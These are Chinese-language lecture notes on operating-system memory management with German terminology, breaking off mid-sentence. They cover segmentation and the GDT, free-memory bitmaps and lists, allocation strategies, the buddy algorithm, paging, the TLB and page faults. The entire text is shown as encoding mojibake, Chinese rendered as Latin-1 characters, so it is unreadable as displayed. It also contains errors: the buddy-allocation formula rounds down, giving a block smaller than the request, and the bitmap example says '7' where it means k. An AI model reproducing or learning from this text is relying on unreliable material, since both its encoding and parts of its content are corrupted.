ä¸¾ä¸ªä¾‹å­åŒºåˆ†ä¸€ä¸‹åŸºå€å¯»å€ï¼ˆBasis-Adressierungï¼‰å’Œç›´æ¥å¯»å€ï¼ˆDirekte Adressierungï¼‰ï¼šå‡è®¾æˆ‘ä»¬ç°åœ¨çš„å†…å­˜ç©ºé—´æœ‰15ä¸ªBlockï¼Œå¹¶ä¸”æœ‰2ä¸ªç¨‹åºåœ¨ä½¿ç”¨å†…å­˜ï¼Œæˆ‘ä»¬å°†1-5åˆ†ç»™ç¬¬ä¸€ä¸ªç¨‹åºï¼ŒæŠŠ6-10åˆ†ç»™ç¬¬äºŒä¸ªç¨‹åºã€‚å¦‚æœæ˜¯ç›´æ¥å¯»å€çš„è¯ï¼Œç¬¬ä¸€ä¸ªç¨‹åºçš„åœ°å€éœ€è¦è®°å½•æˆï¼ˆ1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼‰ï¼Œç¬¬äºŒä¸ªéœ€è¦è®°å½•ï¼ˆ6ï¼Œ7ï¼Œ8ï¼Œ9ï¼Œ10ï¼‰ã€‚ä½†å¦‚æœæ˜¯åŸºå€å¯»å€çš„è¯ï¼Œç¬¬äºŒä¸ªåªéœ€è¦è®°å½•ï¼ˆ5ï¼›1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼‰ï¼Œä¸»è¦ä¼šè®°å½•ç›¸å¯¹ä½ç½®ã€‚è¿™æ ·ä¸€æ¥åœ¨é‡æ–°åˆ†é…å†…å­˜ç©ºé—´æ—¶åªéœ€è¦ä¿®æ”¹basisï¼ˆä¹Ÿå°±æ˜¯5ï¼‰å³å¯ï¼ˆæ¯”å¦‚è¯´ï¼ˆ10ï¼›1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼‰ï¼‰ï¼Œå…¶ä»–çš„ä¸éœ€è¦æ”¹å˜ã€‚ å½“ç„¶åŸºå€å¯»å€ï¼ˆBasis-Adressierungï¼‰ä¹Ÿæœ‰ä¸ªç¼ºç‚¹ï¼Œé‚£å°±æ˜¯æ¯æ¬¡è®¡ç®—åœ°å€æ—¶éƒ½éœ€è¦è¿›è¡Œä¸€æ¬¡åŠ æ³•æ“ä½œã€‚ï¼ˆAufwendige Additionsoperationï¼‰ æ®µå¼å¯»å€ï¼ˆSegmentadressierungï¼‰å°†Adressraumsåˆ†æˆä¸åŒé•¿åº¦çš„é€»è¾‘æ®µï¼ˆlogische Segmenteï¼‰ï¼Œæ¯”å¦‚è¯´åˆ†æˆStack-, Daten-, Code-Segmentã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å¯ä»¥ç»™æ¯ä¸€æ®µå†…å®¹ä¸åŒçš„æƒé™ï¼ˆZugriffsberechtigungenï¼‰ï¼Œä»¥æé«˜å®‰å…¨æ€§ï¼Œé’ˆå¯¹pwnçš„æ”»å‡»ç‰¹åˆ«æœ‰ç”¨ã€‚ æ¯ä¸ªæ®µéœ€è¦ä¸¤ä¸ªåŸºæœ¬ä¿¡æ¯ï¼šæ®µèµ·å§‹åœ°å€ï¼ˆSegmentanfangsadresseï¼‰å’Œæ®µçš„é•¿åº¦ï¼ˆLÃ¤nge des Segmentsï¼‰ã€‚ CPUé€šå¸¸æä¾›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼ˆSegmentregisterï¼‰æ¥ä¿å­˜æ®µä¿¡æ¯ã€‚ åªä¸è¿‡ä¸»è¦æ˜¯32 ä½æ“ä½œç³»ç»Ÿä¼šä½¿ç”¨æ®µæœºåˆ¶ï¼Œè€Œåœ¨64 ä½ç³»ç»Ÿä¸­åŸºæœ¬ä¸ç”¨æ®µæœºåˆ¶ï¼Œæœ€å¤šç”¨äºçº¿ç¨‹ç®¡ç†ï¼ˆTLSï¼‰å’Œå…¼å®¹æ€§æ”¯æŒã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹x86é‡Œçš„æ®µå¼å¯»å€ï¼ˆSegmentadressierungï¼‰çš„ä¾‹å­ï¼š x86 æ¶æ„ä¼šä½¿ç”¨ä¸€ä¸ªå«åšå…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGlobal Descriptor Table, GDTï¼‰çš„æ•°æ®ç»“æ„æ¥ç®¡ç†æ®µï¼Œæ¯ä¸€é¡¹ä¼šåŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š åŸºåœ°å€ï¼ˆBasisadresseï¼‰ æ®µçš„é•¿åº¦ï¼ˆLÃ¤nge des Segmentsï¼‰ æ ‡å¿—ä½ï¼ˆFlagsï¼‰ï¼šä¾‹å¦‚Zugriffä»¥åŠSegmentçš„ç±»å‹ï¼ˆCodeï¼ŒDatenè¿˜æ˜¯Stackï¼‰ è€Œæ®µå¯„å­˜å™¨ï¼ˆSegmentregisterï¼‰ä¸­ä¿å­˜çš„ä¸æ˜¯åœ°å€ï¼Œè€Œæ˜¯GDTè¡¨ä¸­çš„ä¸€ä¸ªç´¢å¼•ã€‚ 1. æƒ³è¦è®¿é—® cs:0x800 çš„è¯ï¼Œéœ€è¦å…ˆåœ¨æ®µå¯„å­˜å™¨ï¼ˆSegmentregisterï¼‰æ‰¾åˆ°cså¯¹åº”çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ 0x08ï¼Œç„¶åæ‰¾åˆ°è¿™ä¸ªå€¼åœ¨DGTå¯¹åº”çš„é‚£ä¸€è¡Œä¿¡æ¯ã€‚éšåè®¡ç®— 0x10000 + 0x800 = 0x10800ã€‚ç¡®è®¤å®ƒåœ¨èŒƒå›´å†…ï¼Œæ‰€ä»¥è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¦çš„åœ°å€ã€‚ 2. æƒ³è¦è®¿é—® es:0x800 çš„è¯ï¼Œéœ€è¦å…ˆåœ¨æ®µå¯„å­˜å™¨ï¼ˆSegmentregisterï¼‰æ‰¾åˆ°eså¯¹åº”çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ 0x10ï¼Œç„¶åæ‰¾åˆ°è¿™ä¸ªå€¼åœ¨DGTå¯¹åº”çš„é‚£ä¸€è¡Œä¿¡æ¯ã€‚éšåè®¡ç®— 0x20000 + 0x800ï¼Œä¼šå‘ç°è¶…å‡ºèŒƒå›´äº†ï¼Œå› ä¸ºå®ƒçš„é•¿åº¦åªæœ‰ 0x00800ï¼Œæ‰€ä»¥ä¼šè¿”å› â€œSegmentation Faultâ€ã€‚ ç©ºé—²å†…å­˜ç®¡ç†ï¼ˆFreispeicherverwaltungï¼‰å­˜å‚¨ç»“æ„ä½å›¾ï¼ˆBitmapï¼‰å°†å­˜å‚¨ç©ºé—´åˆ†æˆç›¸åŒå¤§å°çš„å—ï¼ˆBlÃ¶ckeï¼‰ï¼Œæ¯ä¸ªå—ç”¨ä¸€ä¸ªbitæ ‡è®°ï¼Œ1è¡¨ç¤ºå·²å ç”¨ï¼Œ0è¡¨ç¤ºç©ºé—²ã€‚è¿™ä¸€ä¸²å†…å®¹å°±æ˜¯ä½å›¾ï¼ˆBitmapï¼‰ã€‚ ä¾‹å­ï¼š ä½†æ˜¯å®ç°è¿‡ç¨‹ä¸­ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼šBlcokçš„å¤§å°è¯¥æ€ä¹ˆé€‰æ‹©å‘¢ï¼Ÿé€‰å°äº†å°±ä¼šéœ€è¦æ›´å¤§ä½å›¾ï¼Œä½†é€‰å¤§äº†åˆå®¹æ˜“å¯¼è‡´æµªè´¹ã€‚ ä¼˜åŠ¿ï¼š å¯ä»¥ç®€å•å¿«é€Ÿåœ°è®¿é—®å›ºå®šå¤§å°çš„å†…å­˜å—ã€‚ ç¼ºç‚¹ï¼š å‡å¦‚æœ‰ä¸ªè¿›ç¨‹éœ€è¦kä¸ªBlockï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨ä½å›¾é‡Œæ‰¾åˆ°7ä¸ªè¿ç»­çš„0ï¼Œè¿™ä¸ªçš„å¼€é”€å°±å¤ªå¤§äº†ã€‚ é“¾è¡¨ï¼ˆVerkettete Listeï¼‰è¿˜æ˜¯å°†å­˜å‚¨ç©ºé—´åˆ†æˆç›¸åŒå¤§å°çš„å—ï¼ˆBlÃ¶ckeï¼‰ï¼Œç„¶åé“¾è¡¨è®°å½•å—çš„å ç”¨ä¿¡æ¯ï¼š é“¾è¡¨çš„æ¯ä¸€é¡¹å­˜å‚¨ï¼š å¼€å§‹åœ°å€ é•¿åº¦ æŒ‡å‘ä¸‹ä¸€é¡¹çš„æŒ‡é’ˆï¼ˆeinen Zeiger auf den nÃ¤chsten Eintrag (oder Terminator T == NULL)ï¼‰ ä¾‹å­ï¼š Pè¡¨ç¤ºå·²è¢«è¿›ç¨‹å ç”¨ï¼ŒFè¡¨ç©ºé—²ã€‚ ä¼˜ç‚¹ï¼š çµæ´»ï¼ˆFlexible Speicheraufteilungï¼‰ ç¼ºç‚¹ï¼š éœ€è¦çº¿æ€§æœç´¢ï¼ˆLineare Sucheï¼‰ éœ€è¦æŒ¨ä¸ªæ‰¾æœ‰æ²¡æœ‰åˆé€‚çš„ã€‚ æ²¡æœ‰å›ºå®šçš„ç®¡ç†ç»“æ„ ä¼˜åŒ–çš„åŠæ³•ï¼š åˆ†åˆ«ç»´æŠ¤ä¸¤ä¸ªé“¾è¡¨ï¼Œä¸€ä¸ªå­˜å‚¨å·²åˆ†é…çš„å†…å­˜å—ï¼Œä¸€ä¸ªå­˜å‚¨ç©ºé—²çš„å†…å­˜å—ã€‚ æŒ‰ç…§å†…å­˜å—å¤§å°æ’åº ä½¿ç”¨å¹³è¡¡æ ‘ç»“æ„ç®¡ç†é“¾è¡¨ï¼ˆ(balancierter) Baumstrukturï¼‰ åŒæ—¶ä½¿ç”¨å¤šä¸ªé“¾è¡¨ å†…å­˜åˆ†é…ç­–ç•¥ï¼ˆBelegungstrategienï¼‰ç”±äºéœ€è¦ä¸€ç›´åˆ†é…å†é‡Šæ”¾è¿›ç¨‹çš„å­˜å‚¨ç©ºé—´ï¼Œæ‰€ä»¥å­˜å‚¨ç©ºé—´å®¹æ˜“ç¢ç‰‡åŒ–ã€‚æ¯”å¦‚è¯´åœ¨ä¸Šé¢é‚£å¼ å›¾é‡Œæœ‰ç€å¥½å‡ ä¸ªç©ºé—²çš„è¿ç»­çš„å­˜å‚¨ç©ºé—´ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•ç»™æ¯ä¸ªè¿›ç¨‹é€‰æ‹©ä¸€å—åˆé€‚çš„ä½ç½®å‘¢ï¼Ÿ ä¸€èˆ¬ä¼šç”¨åˆ°ä»¥ä¸‹å‡ ä¸ªç­–ç•¥ï¼š ï¼ˆä»¥è¿™ä¸ªä¸ºä¾‹:ï¼‰ First-Fitä»å‰å¾€åï¼Œæ‰¾åˆ°å¤§å°å¤Ÿçš„ç›´æ¥ç»™ã€‚ Next-Fitä»ä¸Šæ¬¡åœæ­¢çš„åœ°æ–¹å¼€å§‹ï¼Œæ‰¾åˆ°å¤Ÿçš„ç›´æ¥ç»™ã€‚ Best-Fitåˆ†é…â€œæœ€å°å‰©ä½™ç©ºé—´â€çš„ç©ºé—²å—ï¼ˆFreibereich mit dem geringsten Verschnittï¼‰ Worst-Fitåˆ†é…â€œæœ€å¤§å‰©ä½™ç©ºé—´â€çš„ç©ºé—²å—ï¼ˆFreibereich mit dem grÃ¶ÃŸten Verschnittï¼‰ Buddy-Algorithmuså°†å­˜å‚¨ç©ºé—´åˆ†æˆ $2^k$ å¤§å°çš„Blockï¼Œwhere $l \\leq k \\leq u$ï¼Œ$2^l$æ˜¯æœ€å°çš„å¯å ç”¨çš„ç©ºé—´å¤§å°ï¼Œ$2^u$æ˜¯æœ€å¤§çš„å¯å ç”¨çš„ç©ºé—´å¤§å°ã€‚å½“ä¸€ä¸ªè¿›ç¨‹éœ€è¦çš„å­˜å‚¨ç©ºé—´ä¸º $x$ æ—¶ï¼Œä¼šç»™å®ƒåˆ†é…ä¸€å—å¤§å°ä¸º $2^{\\lfloor log_2(x) \\rfloor}$ çš„Blockã€‚ è¿™æ ·ä¸€æ¥æ¯æ¬¡æœ€å¤šä¼šæµªè´¹åŠä¸ªBlockå¤§å°çš„å­˜å‚¨ç©ºé—´ã€‚ åˆ†é…çš„å…·ä½“ç®—æ³•çœ‹è¿™ä¸ªä¾‹å­å°±å¥½ï¼šï¼ˆéœ€è¦é¢å¤–æ³¨æ„å®ƒåˆå¹¶ç©ºé—²å—çš„ç®—æ³•ï¼‰ ç¢ç‰‡åŒ–ï¼ˆFragmentierungï¼‰ä¸€èˆ¬ä¼šåˆ†æˆå†…éƒ¨ç¢ç‰‡ä¸å¤–éƒ¨ç¢ç‰‡ã€‚ å†…éƒ¨ç¢ç‰‡ï¼ˆInterne Fragmentierungï¼‰ï¼šåœ¨æŒ‰å—åˆ†é…å†…å­˜æ—¶ï¼Œé€šå¸¸ä¼šåˆ†é…å¤šäºå®é™…æ‰€éœ€çš„å†…å­˜ã€‚è¿™éƒ¨åˆ†å¤šä½™çš„å†…å­˜åŒºåŸŸæ—¢ä¸èƒ½è¢«å½“å‰è¿›ç¨‹ä½¿ç”¨ï¼ˆå†…éƒ¨ï¼‰ï¼Œä¹Ÿä¸èƒ½è¢«å…¶ä»–è¿›ç¨‹ä½¿ç”¨ï¼ˆå¤–éƒ¨ï¼‰ã€‚ä¹Ÿå°±æ˜¯ä¼šäº§ç”Ÿå¾ˆå¤šç¢ç‰‡ï¼ˆVerschnittï¼‰ã€‚è¿™äº›å¤šä½™çš„éƒ¨åˆ†å°±è¢«å«åšå†…éƒ¨ç¢ç‰‡ã€‚ ä¾‹å¦‚Buddy-Algorithmusä¸»è¦å¸¦æ¥çš„ä¾¿æ˜¯å†…éƒ¨ç¢ç‰‡ã€‚å®ƒç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…äº†ä¸€ä¸ªBlockä¹‹åï¼Œè¿™ä¸ªBlocké‡Œå¤šä½™çš„éƒ¨åˆ†æ˜¯ä¸ä¼šåˆ†é…ç»™å…¶ä»–è¿›ç¨‹çš„ã€‚ å¤–éƒ¨ç¢ç‰‡ï¼ˆExterne Fragmentierungï¼‰ï¼šç”±äºåˆ›å»ºå’Œé‡Šæ”¾å†…å­˜å—çš„åŠ¨æ€å˜åŒ–ï¼Œä¼šåœ¨ä¸»å­˜ä¸­äº§ç”Ÿç©ºæ´ï¼ˆLÃ¶cherï¼‰ã€‚å³ä½¿æ€»çš„ç©ºé—²å†…å­˜é‡æ˜¯è¶³å¤Ÿçš„ï¼Œä¹Ÿå¯èƒ½æ²¡æœ‰ä¸€ä¸ªè¶³å¤Ÿå¤§çš„è¿ç»­å†…å­˜åŒºåŸŸæ¥æ»¡è¶³ä¸€ä¸ªè¯·æ±‚ã€‚è¿™äº›ç©ºé—²å†…å­˜å°±è¢«å«åšå¤–éƒ¨ç¢ç‰‡ã€‚ æ¯”å¦‚è¯´ä½¿ç”¨Best-Fitç­–ç•¥ï¼Œå°±ä¼šå‰©ä¸‹æ¥å¾ˆå¤šå°çš„ä¸è¿ç»­çš„ç©ºé—²å—ã€‚ è™šæ‹Ÿå†…å­˜ç®¡ç†ï¼ˆVirtuelle Speicherverwaltungï¼‰ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯å¤§äºå®é™…å¯ç”¨çš„ç‰©ç†å†…å­˜çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åŒæ ·éœ€è¦ç®¡ç†è™šæ‹Ÿå†…å­˜ï¼Œä»¥å†³å®šå°†å“ªäº›éƒ¨åˆ†åŠ è½½åˆ°ï¼ˆç‰©ç†çš„å®é™…ï¼‰å†…å­˜ä¸­ã€‚ æœ€å¸¸ç”¨çš„å®ç°æ–¹å¼ä¾¿æ˜¯åˆ†é¡µï¼ˆPagingï¼‰ï¼š å°†è™šæ‹Ÿåœ°å€ç©ºé—´è¢«åˆ’åˆ†ä¸ºé¡µé¢ï¼ˆSeitenï¼ŒPagesï¼‰ï¼Œå†…å­˜ï¼ˆHauptspeicherï¼‰è¢«åˆ’åˆ†ä¸ºç‰©ç†é¡µæ¡†ï¼ˆKachelnï¼ŒFramesï¼‰ã€‚é€šå¸¸æ¯ä¸€é¡µå’Œæ¯ä¸ªé¡µæ¡†çš„å¤§å°ç›¸åŒï¼Œæˆ–è€…è‡³å°‘é¡µçš„å¤§å°æ˜¯é¡µæ¡†å¤§å°çš„å€æ•°ã€‚ æ“ä½œç³»ç»Ÿéœ€è¦åšçš„ä¾¿æ˜¯å°†é¡µé¢æ˜ å°„åˆ°é¡µæ¡†ï¼ˆAbbilden von Seiten auf Kachelnï¼‰ã€‚ è¿™ä¸ªæ˜ å°„å…·ä½“ç”±å†…å­˜ç®¡ç†å•å…ƒï¼ˆMemory Management Unitï¼ŒMMUï¼‰å®Œæˆã€‚ Pagingä¸­ä¸‰ä¸ªé‡è¦æ¦‚å¿µï¼šï¼ˆä¸‹é¢ä¼šè¯¦ç»†è®²ï¼‰ é¡µè¡¨ï¼ˆPage Tableï¼‰ï¼š è´Ÿè´£ç®¡ç†è™šæ‹Ÿé¡µä¸ç‰©ç†é¡µæ¡†ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œæ“ä½œç³»ç»Ÿä¸ºæ¯ä¸ªè¿›ç¨‹ç»´æŠ¤ä¸€å¼ é¡µè¡¨ã€‚ ç¼ºé¡µå¼‚å¸¸ï¼ˆSeitenfehlerï¼ŒPage Faultï¼‰ï¼š å½“è®¿é—®ä¸€ä¸ªå°šæœªè¢«åŠ è½½åˆ°å†…å­˜çš„è™šæ‹Ÿé¡µæ—¶ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªé¡µé”™è¯¯ï¼ˆPage Faultï¼‰ï¼Œç¡¬ä»¶ä¼šå‘å‡ºä¸€ä¸ªä¸­æ–­ä¿¡å·ã€‚æ“ä½œç³»ç»Ÿå“åº”è¿™ä¸ªä¸­æ–­ï¼ŒæŠŠç¼ºå¤±çš„é¡µä»ç£ç›˜åŠ è½½åˆ°å†…å­˜ é¡µé¢æ¢å…¥ï¼ˆSeiteneinlagerungï¼‰ï¼š å¦‚æœå†…å­˜å·²æ»¡ï¼Œåˆ™éœ€è¦å°†å·²æœ‰çš„é¡µç§»å‡ºï¼ˆæ¢å‡ºï¼‰æ¥è…¾å‡ºç©ºé—´ï¼Œè¢«æ¢å‡ºçš„é¡µä¼šè¢«ä¿å­˜åˆ°ç¡¬ç›˜ä¸­ã€‚ æµç¨‹ï¼š ç¨‹åºè®¿é—®è™šæ‹Ÿé¡µ â†’ æ£€æŸ¥é¡µè¡¨ â†’ è‹¥é¡µä¸åœ¨å†…å­˜ â†’ è§¦å‘é¡µé”™è¯¯ï¼ˆPage Faultï¼‰ â†’ OS è°ƒå…¥é¡µé¢ â†’ è‹¥å†…å­˜æ»¡ â†’ é¡µé¢ç½®æ¢ â†’ æ›´æ–°é¡µè¡¨ â†’ ç»§ç»­æ‰§è¡Œ ç¡¬ä»¶ç»„ä»¶å¦‚ä¹‹å‰æåˆ°çš„ï¼Œå†…å­˜ç®¡ç†å•å…ƒï¼ˆMemory Management Unitï¼ŒMMUï¼‰è´Ÿè´£å®Œæˆåœ°å€çš„æ˜ å°„ã€‚ å®ƒçš„å·¥ä½œæµç¨‹å¦‚å›¾ï¼š CPU å‘é€è™šæ‹Ÿåœ°å€ï¼ˆVAï¼‰ç»™ MMU MMU æ ¹æ®è™šæ‹Ÿåœ°å€ç¡®å®š Page Table Entry çš„åœ°å€ï¼ˆPTEAï¼‰ MMU ä»ç¼“å­˜æˆ–å†…å­˜ä¸­è¯»å–é¡µè¡¨é¡¹ï¼ˆPTEï¼‰ MMU æ ¹æ®é¡µè¡¨é¡¹è®¡ç®—å‡ºç‰©ç†åœ°å€ï¼ˆPAï¼‰ ç¼“å­˜/å†…å­˜å°†ç‰©ç†åœ°å€å¯¹åº”çš„æ•°æ®ï¼ˆDatenï¼‰å‘é€å› CPU ä½†è¿™æ ·ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼šç”±äºé¡µè¡¨é€šå¸¸å­˜æ”¾åœ¨ä¸»å­˜ä¸­ï¼Œæ‰€ä»¥åœ°å€è½¬æ¢ï¼ˆAdressabbildungï¼‰çš„å¼€é”€ä¼šéå¸¸å¤§ã€‚ å› æ­¤å¯ä»¥åˆ©ç”¨ç¼“å­˜ï¼ˆCacheï¼‰æ¥æ”¹å–„è¿™ä¸ªé—®é¢˜ï¼šåœ°å€è½¬æ¢åå¤‡ç¼“å†²åŒºï¼ˆTranslation Lookaside Bufferï¼ŒTLBï¼‰ï¼Œå®ƒè´Ÿè´£å­˜å‚¨è¿‘æœŸè®¿é—®è¿‡çš„é¡µè¡¨é¡¹ï¼ˆPage Table Entryï¼‰ã€‚ æµç¨‹ï¼š CPU å‘é€è™šæ‹Ÿåœ°å€ VA MMU æå–å‡ºè™šæ‹Ÿé¡µå· VPNï¼ŒæŸ¥è¯¢ TLB å¦‚æœ TLB å‘½ä¸­ï¼ˆTLB Hitï¼‰ï¼Œç›´æ¥è·å¾—é¡µè¡¨é¡¹ï¼ˆPTEï¼‰ MMU æ ¹æ® PTE ç”Ÿæˆç‰©ç†åœ°å€ï¼ˆPAï¼‰ æ•°æ®ä»ç‰©ç†å†…å­˜ä¸­è¿”å›åˆ° CPU æ²¡æœ‰ Hit çš„æƒ…å†µå«åš TLB Missï¼Œä¼šéœ€è¦ä¸€æ¬¡é¢å¤–çš„å†…å­˜è®¿é—®æ¥åŠ è½½é¡µè¡¨é¡¹ï¼ˆPTEï¼‰ï¼š é¡µè¡¨ï¼ˆPage Tableï¼‰ä¸€ä¸ªè™šæ‹Ÿåœ°å€ v ä¼šè¢«è§£é‡Šä¸ºv=(s,w)ï¼Œå…¶ä¸­sè¡¨ç¤ºé¡µå·ï¼ˆSeitenummerï¼‰ï¼Œwè¡¨ç¤ºåç§»é‡ï¼ˆOffsetï¼‰ã€‚ æ¯ä¸€é¡µéƒ½å¯¹åº”ä¸€ä¸ªé¡µè¡¨é¡¹ï¼ˆ1 Page-Table-Eintrag pro Seiteï¼‰ï¼Œè€Œè¿™ä¸ªé¡µè¡¨é¡¹é‡Œä¼šå­˜å‚¨é¡µæ¡†å·ï¼ˆFrame-Nummerï¼‰ã€‚åœ¨è½¬æ¢åœ°å€æ—¶ï¼Œsä¼šè¢«ç›´æ¥è½¬æ¢æˆé¡µæ¡†å·ï¼ˆFrame-Nummerï¼‰ï¼Œç„¶åå’Œwæ‹¼èµ·æ¥ç»„æˆçœŸæ­£çš„ç‰©ç†åœ°å€ã€‚å¦‚å›¾ï¼š å…·ä½“çš„è½¬æ¢è¿‡ç¨‹å¯ä»¥çœ‹æ–‡ç« æœ«å°¾çš„ç›¸å…³ä¾‹é¢˜ã€‚ è€Œé¡µè¡¨ä¸­é™¤äº†åœ°å€ï¼Œè¿˜ä¼šå­˜å‚¨é™„åŠ ä¿¡æ¯ï¼Œé€šè¿‡å•ä¸ªä½ï¼ˆBitï¼‰æ¥è¡¨ç¤ºï¼š Pï¼ˆpresentï¼‰ä½ï¼šæ˜¯å¦å­˜åœ¨ è¡¨ç¤ºå¯¹åº”çš„ç‰©ç†åœ°å€æ˜¯å¦å­˜åœ¨/æœ‰æ•ˆ U/Sï¼ˆuser/supervisorï¼‰ä½ï¼šç”¨æˆ·/å†…æ ¸æ¨¡å¼è®¿é—®æ§åˆ¶ æŒ‡ç¤ºæ˜¯å¦åªæœ‰æ“ä½œç³»ç»Ÿå†…æ ¸ï¼ˆBetriebssystemkernï¼‰å¯ä»¥è®¿é—®è¯¥é¡µé¢ Rï¼ˆreferencedï¼‰/ Aï¼ˆaccessedï¼‰ä½ï¼šæ˜¯å¦è¢«è®¿é—®è¿‡ åªè¦è¿™ä¸ªé¡µé¢è¢«è®¿é—®ï¼ˆzugegriffenï¼‰ï¼ŒCPUå°±ä¼šè‡ªåŠ¨è®¾ç½®è¿™ä¸€ä½ï¼ˆä¸º1ï¼‰ã€‚ Mï¼ˆmodifyï¼‰/ Dirty Bitï¼šæ˜¯å¦è¢«ä¿®æ”¹è¿‡ åªè¦è¿™é¡µé‡Œæœ‰è‡³å°‘ä¸€ä¸ªå­—èŠ‚è¢«å†™å…¥ï¼ˆgeschriebenï¼‰ï¼ŒCPUå°±ä¼šè‡ªåŠ¨è®¾ç½®è¿™ä¸€ä½ï¼ˆä¸º1ï¼‰ã€‚ XDï¼ˆexecute-disableï¼‰ä½ï¼šç¦æ­¢æ‰§è¡Œä½ è¡¨ç¤ºè¯¥é¡µæ˜¯å¦å…è®¸æ‰§è¡ŒæŒ‡ä»¤ã€‚å±äºä¿æŠ¤æªæ–½ã€‚ å¤šçº§é¡µè¡¨ï¼ˆMehrstufige Seitentabellenï¼‰å¦‚æœè™šæ‹Ÿåœ°å€ç©ºé—´å¾ˆå¤§ï¼Œé‚£ä¹ˆç›¸åº”çš„é¡µè¡¨ï¼ˆPage Tableï¼‰ä¹Ÿéå¸¸å¤§ï¼Œæ„å‘³ç€å°†æ•´ä¸ªé¡µè¡¨æ”¾å…¥å†…å­˜ä¼šå ç”¨å¤§é‡å†…å­˜èµ„æºã€‚ æ‰€ä»¥éœ€è¦å¼•å…¥å¤šçº§é¡µè¡¨ç»“æ„ï¼Œæ¯ä¸€çº§é¡µè¡¨åªè´Ÿè´£ä¸€éƒ¨åˆ†åœ°å€ç©ºé—´ï¼ŒæŒ‰éœ€åŠ è½½ã€‚ é¡µé”™è¯¯ï¼ˆSeitenfehlerï¼ŒPage Faultï¼‰å½“ç¨‹åºè®¿é—®ä¸€ä¸ªè™šæ‹Ÿåœ°å€æ—¶ï¼Œå¦‚æœè¯¥åœ°å€å¯¹åº”çš„é¡µé¢ä¸åœ¨å†…å­˜ä¸­ï¼ˆå³é¡µè¡¨ä¸­çš„ P-Bit æœªè®¾ç½®ï¼‰ï¼Œå°±ä¼šå‘ç”Ÿé¡µé”™è¯¯ï¼ˆSeitenfehlerï¼ŒPage Faultï¼‰ã€‚ç¡¬ä»¶ä¼šè§¦å‘ä¸­æ–­ï¼ˆInterruptï¼‰ï¼Œäº¤ç”±æ“ä½œç³»ç»Ÿå¤„ç†ï¼Œæ‰§è¡Œé¡µé”™è¯¯å¤„ç†å™¨ï¼ˆPage-Fault-Handlerï¼‰ã€‚ å¤„ç†æ—¶åˆ†2ç§æƒ…å†µï¼š é¡µé¢è¢«æ¢å‡ºï¼ˆausgelagertï¼‰ï¼š æŸ¥æ‰¾æ˜¯å¦æœ‰ç©ºé—²é¡µæ¡†ï¼ˆKachelï¼‰ï¼š æœ‰ç©ºé—²ï¼šç›´æ¥åŠ è½½é¡µé¢ æ— ç©ºé—²ï¼šä½¿ç”¨é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆSeitenersetzungsstrategienï¼‰é‡Šæ”¾ç©ºé—´ é¡µé¢ä¸å­˜åœ¨ä¹Ÿæœªè¢«æ¢å‡ºï¼ˆnicht ausgelagertï¼‰ æ“ä½œç³»ç»Ÿä¼šè§¦å‘å†…å­˜ä¿æŠ¤é”™è¯¯ï¼ˆSpeicherschutz-Fehlerï¼‰ ä¹‹åä¾¿ä¼šæ›´æ–°é¡µè¡¨é¡¹ï¼ˆPage-Table-Eintragï¼‰ï¼šè®¾ç½®P-Bitï¼Œæ¸…é™¤R-Bitå’ŒM-Bitã€‚ è¿™äº›æ“ä½œéƒ½å®Œæˆä¹‹åä¾¿ä¼šæ¢å¤ç¨‹åºçš„çŠ¶æ€ã€‚ ç›®å‰è¿™äº›è½¬æ¢åœ°å€çš„æµç¨‹æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼š é¡µé¢ç½®æ¢ç®—æ³•ï¼ˆSeitenersetzungsstrategienï¼‰æ›¿æ¢é¡µé¢çš„æ—¶å€™ï¼Œæˆ‘ä»¬æœ‰3ä¸ªé—®é¢˜éœ€è¦è€ƒè™‘ï¼šå½“å†…å­˜æ»¡äº†ï¼Œæˆ‘ä»¬åº”è¯¥ åœ¨ä»€ä¹ˆæ—¶å€™åŠ è½½é¡µé¢ï¼Ÿ é’ˆå¯¹è¿™ä¸ªé—®é¢˜æˆ‘ä»¬æœ‰2ç§æ–¹æ³•ï¼š æŒ‰éœ€åˆ†é¡µï¼ˆOn-Demand Pagingï¼‰ï¼šé¡µé¢åªæœ‰åœ¨ç¡®å®è¢«è®¿é—®åˆ°æ—¶ï¼Œæ‰ä¼šè¢«åŠ è½½åˆ°ä¸»å­˜ã€‚ é¢„å–ï¼ˆPrefetchingï¼‰ï¼šä¼šæå‰åŠ è½½é¡µé¢ä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚ä½†è¿™æ ·ä¸€æ¥åˆä¼šå›åˆ°ä¸€å¼€å§‹çš„é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æå‰å¤šä¹…åŠ è½½å“ªäº›å†…å®¹å‘¢ï¼Ÿ å°†é¡µé¢åŠ è½½åˆ°å“ªé‡Œï¼Ÿ æ‰€æœ‰é¡µæ¡†ï¼ˆKachelnï¼‰åœ°ä½ç›¸åŒï¼Œä¸€èˆ¬ä¸éœ€è¦ç­–ç•¥å†³å®šã€‚ä½†åœ¨å®é™…ä¸­æ“ä½œç³»ç»Ÿä¸€èˆ¬ä¼šå¯¹å†…æ ¸ä»£ç å’Œå†…æ ¸æ•°æ®åšç‰¹æ®Šå¤„ç†ï¼Œæ¯”å¦‚è¯´æ’ç­‰æ˜ å°„ï¼ˆIdentity Mappingï¼‰ï¼Œå³è™šæ‹Ÿåœ°å€ = 